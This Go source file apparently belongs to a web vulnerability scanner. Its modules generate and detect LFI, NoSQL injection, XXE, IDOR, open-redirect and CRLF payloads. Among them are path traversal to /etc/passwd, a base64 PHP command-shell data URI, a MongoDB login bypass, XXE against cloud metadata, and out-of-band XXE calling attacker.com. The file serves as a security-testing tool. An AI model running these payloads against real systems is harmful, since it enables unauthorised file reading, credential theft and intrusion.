package vulns

import (
	"fmt"
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

// ===== LFI / Path Traversal =====
type LFIModule struct{}

func (m *LFIModule) Name() string        { return "lfi" }
func (m *LFIModule) Description() string { return "Local File Inclusion / Path Traversal" }

func (m *LFIModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload
	raw := []struct{ v, t string }{
		{`../../../etc/passwd`, "basic"}, {`....//....//....//etc/passwd`, "double-dot"},
		{`..%2f..%2f..%2fetc%2fpasswd`, "url-encoded"}, {`..%252f..%252f..%252fetc%252fpasswd`, "double-encoded"},
		{`....\/....\/....\/etc/passwd`, "backslash"}, {`/etc/passwd`, "absolute"},
		{`/etc/passwd%00`, "null-byte"}, {`/etc/passwd%00.png`, "null-ext"},
		{`..%c0%af..%c0%af..%c0%afetc/passwd`, "unicode-overlong"},
		{`..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd`, "fullwidth-slash"},
		{`/proc/self/environ`, "proc-env"}, {`/proc/self/cmdline`, "proc-cmd"},
		{`....//....//....//windows/win.ini`, "windows"}, {`..\..\..\..\windows\win.ini`, "windows-backslash"},
		{`php://filter/convert.base64-encode/resource=/etc/passwd`, "php-filter"},
		{`php://filter/read=string.rot13/resource=/etc/passwd`, "php-filter-rot13"},
		{`php://input`, "php-input"},
		{`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+`, "php-data"},
		{`expect://id`, "php-expect"},
		{`file:///etc/passwd`, "file-proto"},
		{`/var/log/apache2/access.log`, "log-poison-apache"},
		{`/var/log/nginx/access.log`, "log-poison-nginx"},
	}
	for _, point := range points {
		for _, p := range raw {
			payloads = append(payloads, mutator.Payload{Value: p.v, Point: point, Module: "lfi", Variant: p.t})
		}
	}
	return payloads
}

func (m *LFIModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {
	indicators := []string{"root:x:0:0", "[fonts]", "for 16-bit app support", "DOCUMENT_ROOT", "PATH=", "HOME="}
	for _, ind := range indicators {
		if strings.Contains(respBody, ind) && !strings.Contains(baseBody, ind) {
			return &Finding{Module: "lfi", Severity: "critical", Confidence: "confirmed",
				Title: "LFI / Path Traversal - File read", Payload: payload.Value, Point: payload.Point,
				Evidence: ind, OWASP: "A01:2021 Broken Access Control", CWE: "CWE-22"}
		}
	}
	return nil
}

// ===== NoSQL Injection =====
type NoSQLiModule struct{}

func (m *NoSQLiModule) Name() string        { return "nosqli" }
func (m *NoSQLiModule) Description() string { return "NoSQL Injection (MongoDB, etc)" }

func (m *NoSQLiModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload
	raw := []struct{ v, t string }{
		{`{"$gt":""}`, "mongo-gt"}, {`{"$ne":""}`, "mongo-ne"}, {`{"$regex":".*"}`, "mongo-regex"},
		{`{"$gt":"","$lt":"z"}`, "mongo-range"}, {`{"$where":"sleep(5000)"}`, "mongo-time"},
		{`{"$where":"this.a==this.b"}`, "mongo-where"}, {`[$ne]=1`, "url-ne"},
		{`[$gt]=`, "url-gt"}, {`[$regex]=.*`, "url-regex"},
		{`true,$where:'1==1'`, "mongo-inject"}, {`';sleep(5000);var a='`, "mongo-js-inject"},
		{`{"username":{"$gt":""},"password":{"$gt":""}}`, "mongo-auth-bypass"},
		{`' || '1'=='1`, "mongo-string-or"},
	}
	for _, point := range points {
		for _, p := range raw {
			payloads = append(payloads, mutator.Payload{Value: p.v, Point: point, Module: "nosqli", Variant: p.t})
		}
	}
	return payloads
}

func (m *NoSQLiModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {
	// Time-based
	if strings.Contains(payload.Variant, "time") && respTime-baseTime > 4500 {
		return &Finding{Module: "nosqli", Severity: "critical", Confidence: "high",
			Title: "NoSQL Injection - Time-based", Payload: payload.Value, Point: payload.Point,
			Evidence: fmt.Sprintf("delta=%dms", respTime-baseTime), OWASP: "A03:2021 Injection", CWE: "CWE-943"}
	}
	// Body diff significativo (auth bypass)
	if len(respBody) != len(baseBody) && abs(len(respBody)-len(baseBody)) > 100 && respStatus == 200 {
		if strings.Contains(payload.Variant, "bypass") || strings.Contains(payload.Variant, "ne") || strings.Contains(payload.Variant, "gt") {
			return &Finding{Module: "nosqli", Severity: "high", Confidence: "medium",
				Title: "NoSQL Injection - Possible auth bypass", Payload: payload.Value, Point: payload.Point,
				Evidence: fmt.Sprintf("body_diff=%d bytes", abs(len(respBody)-len(baseBody))), OWASP: "A03:2021 Injection", CWE: "CWE-943"}
		}
	}
	return nil
}

// ===== XXE =====
type XXEModule struct{}

func (m *XXEModule) Name() string        { return "xxe" }
func (m *XXEModule) Description() string { return "XML External Entity Injection" }

func (m *XXEModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload
	raw := []struct{ v, t string }{
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, "basic"},
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`, "windows"},
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`, "ssrf"},
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>`, "oob"},
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`, "php-expect"},
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>`, "php-filter"},
		{`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "/etc/passwd">]><foo>&xxe;</foo>`, "element"},
		{`<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;%intern;%trick;]><data>ok</data>`, "blind-oob"},
	}
	for _, point := range points {
		for _, p := range raw {
			payloads = append(payloads, mutator.Payload{Value: p.v, Point: point, Module: "xxe", Variant: p.t})
		}
	}
	return payloads
}

func (m *XXEModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {
	indicators := []string{"root:x:0:0", "[fonts]", "ami-id", "iam", "meta-data"}
	for _, ind := range indicators {
		if strings.Contains(respBody, ind) && !strings.Contains(baseBody, ind) {
			return &Finding{Module: "xxe", Severity: "critical", Confidence: "confirmed",
				Title: "XXE - External entity processed", Payload: payload.Value, Point: payload.Point,
				Evidence: ind, OWASP: "A05:2021 Security Misconfiguration", CWE: "CWE-611"}
		}
	}
	return nil
}

// ===== IDOR =====
type IDORModule struct{}

func (m *IDORModule) Name() string        { return "idor" }
func (m *IDORModule) Description() string { return "Insecure Direct Object Reference" }

func (m *IDORModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload
	idPayloads := []string{"1", "2", "0", "-1", "99999", "admin", "root", "../1", "1 OR 1=1"}
	for _, point := range points {
		if looksLikeID(point.Name) {
			for _, p := range idPayloads {
				payloads = append(payloads, mutator.Payload{Value: p, Point: point, Module: "idor", Variant: "enum"})
			}
		}
	}
	return payloads
}

func (m *IDORModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {
	if respStatus == 200 && respBody != baseBody && len(respBody) > 50 {
		return &Finding{Module: "idor", Severity: "high", Confidence: "medium",
			Title: "IDOR - Access to another user object", Payload: payload.Value, Point: payload.Point,
			Evidence: fmt.Sprintf("status=200, body diferente (len=%d vs baseline=%d)", len(respBody), len(baseBody)),
			OWASP: "A01:2021 Broken Access Control", CWE: "CWE-639"}
	}
	return nil
}

func looksLikeID(name string) bool {
	lower := strings.ToLower(name)
	idNames := []string{"id", "uid", "user_id", "userid", "account", "pid", "doc", "file", "order", "num", "ref"}
	for _, n := range idNames {
		if strings.Contains(lower, n) {
			return true
		}
	}
	return false
}

// ===== Open Redirect =====
type OpenRedirectModule struct{}

func (m *OpenRedirectModule) Name() string { return "redirect" }
func (m *OpenRedirectModule) Description() string {
	return "Open Redirect"
}

func (m *OpenRedirectModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload
	raw := []string{
		`https://evil.com`, `//evil.com`, `\/\/evil.com`, `https:evil.com`,
		`//evil.com/%2f..`, `/\evil.com`, `/.evil.com`, `///evil.com`,
		`https://evil.com@target.com`, `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`,
		`%0d%0aLocation:%20http://evil.com`, `//evil%00.com`, `https://evil.com#@target.com`,
	}
	for _, point := range points {
		if looksLikeURL(point.Name) {
			for _, p := range raw {
				payloads = append(payloads, mutator.Payload{Value: p, Point: point, Module: "redirect", Variant: "basic"})
			}
		}
	}
	return payloads
}

func (m *OpenRedirectModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {
	if respStatus >= 300 && respStatus < 400 {
		location := ""
		if locs, ok := respHeaders["Location"]; ok && len(locs) > 0 {
			location = locs[0]
		}
		if strings.Contains(location, "evil.com") {
			return &Finding{Module: "redirect", Severity: "medium", Confidence: "confirmed",
				Title: "Open Redirect", Payload: payload.Value, Point: payload.Point,
				Evidence: "Location: " + location, OWASP: "A01:2021 Broken Access Control", CWE: "CWE-601"}
		}
	}
	return nil
}

func looksLikeURL(name string) bool {
	lower := strings.ToLower(name)
	urlNames := []string{"url", "redirect", "next", "return", "redir", "dest", "goto", "link", "target", "continue", "callback"}
	for _, n := range urlNames {
		if strings.Contains(lower, n) {
			return true
		}
	}
	return false
}

// ===== CRLF Injection =====
type CRLFModule struct{}

func (m *CRLFModule) Name() string        { return "crlf" }
func (m *CRLFModule) Description() string { return "CRLF Injection / HTTP Response Splitting" }

func (m *CRLFModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload
	raw := []string{
		"%0d%0aInjected-Header:true", "%0aInjected-Header:true",
		"\r\nInjected-Header:true", "%E5%98%8A%E5%98%8DInjected:true",
		"%0d%0a%0d%0a<script>alert(1)</script>", "\r\n\r\n<html>injected</html>",
	}
	for _, point := range points {
		for _, p := range raw {
			payloads = append(payloads, mutator.Payload{Value: point.OriginalValue + p, Point: point, Module: "crlf", Variant: "basic"})
		}
	}
	return payloads
}

func (m *CRLFModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {
	if _, ok := respHeaders["Injected-Header"]; ok {
		return &Finding{Module: "crlf", Severity: "high", Confidence: "confirmed",
			Title: "CRLF Injection - Header injected", Payload: payload.Value, Point: payload.Point,
			Evidence: "Header 'Injected-Header' present in response", OWASP: "A03:2021 Injection", CWE: "CWE-113"}
	}
	if strings.Contains(respBody, "<script>alert(1)</script>") && !strings.Contains(baseBody, "<script>alert(1)</script>") {
		return &Finding{Module: "crlf", Severity: "high", Confidence: "confirmed",
			Title: "CRLF Injection → XSS via Response Splitting", Payload: payload.Value, Point: payload.Point,
			Evidence: "HTML injected via response splitting", OWASP: "A03:2021 Injection", CWE: "CWE-113"}
	}
	return nil
}
